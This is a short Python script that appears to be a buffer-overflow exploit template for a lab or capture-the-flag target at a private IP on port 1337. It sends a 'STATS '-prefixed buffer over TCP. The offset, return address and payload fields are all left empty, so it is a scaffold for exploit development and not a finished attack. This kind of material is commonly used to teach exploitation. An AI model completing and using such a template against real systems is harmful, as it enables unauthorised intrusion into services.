#!/usr/bin/env python3
import socket

ip = "10.10.11.32"
port = 1337
prefix = "STATS "

offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("-" * 50)
  print("[!] Sending the buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("\033[38;5;208m[+]\033[0;0m Done!")
  print("-" * 50)
except:
  print("[*] Unable to connect!")
